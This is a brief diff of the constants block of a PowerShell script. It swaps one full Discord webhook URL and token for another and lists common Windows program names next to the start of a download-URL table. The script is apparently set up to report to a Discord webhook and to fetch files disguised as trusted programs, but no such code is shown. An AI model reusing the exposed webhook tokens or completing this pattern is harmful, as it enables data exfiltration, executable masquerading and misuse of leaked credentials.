@@ -1,5 +1,5 @@
 # Define constants
-$WEBHOOK_URL = 'https://discord.com/api/webhooks/1411831853316309032/Aa7_D6ww5IFImc16J8FasyThHIiNz07KRCT1K3fmwQYZC1SwaL35u0RHKMbQuaZKcYYy'
+$WEBHOOK_URL = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'
 $PROGRAM_FILES = "C:\Program Files"
 $EXE_NAMES = @("msedge.exe", "notepad.exe", "calc.exe", "explorer.exe", "mspaint.exe", "winword.exe", "excel.exe")
 $DOWNLOAD_URLS = @{
